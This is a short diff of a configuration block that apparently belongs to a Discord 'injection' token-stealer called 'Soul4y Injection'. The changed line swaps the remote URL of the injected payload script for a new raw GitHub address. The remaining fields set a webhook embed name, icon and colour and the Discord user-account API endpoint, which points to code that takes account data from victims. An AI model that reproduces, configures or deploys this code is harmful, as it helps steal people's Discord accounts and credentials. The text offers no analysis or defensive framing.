@@ -15,7 +15,7 @@ const config = {
   embed_name: 'Soul4y Injection', 
   embed_icon: 'https://raw.githubusercontent.com/beztpro9/Imagecode/main/Capture.png',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/beztpro9/-/main/Url.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
